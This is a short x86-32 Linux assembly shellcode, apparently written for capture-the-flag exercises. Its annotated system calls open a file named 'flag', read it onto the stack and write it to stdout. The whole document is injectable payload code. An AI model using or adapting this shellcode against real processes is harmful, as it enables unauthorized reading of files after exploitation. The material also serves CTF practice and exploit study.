;;;
;;; linux shellcode x86-32:  write(1, read(open("flag"), &esp, 256) )
;;; assumes esp is valid
;;;
;;; @_hugsy_
;;;

;;; init
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx
xor esi, esi
xor edi, edi

;;; fd=sys_open("flag")
mov dword ptr [esp], "galf"
mov dword ptr [esp+4], edi
lea ebx, dword ptr [esp]
mov al, __NR_SYS_open
int 0x80
mov ebx, eax

;;; sys_read(fd, @.stack, 255)
mov al, __NR_SYS_read
sub sp, 260
lea ecx, [esp]
mov dl, 255
int 0x80

;;; sys_write(1, @.stack, 255)
mov al, __NR_SYS_write
mov bl, 1
int 0x80

;;; exit(1)
xor eax, eax
inc eax
mov bl, 1
int 0x80
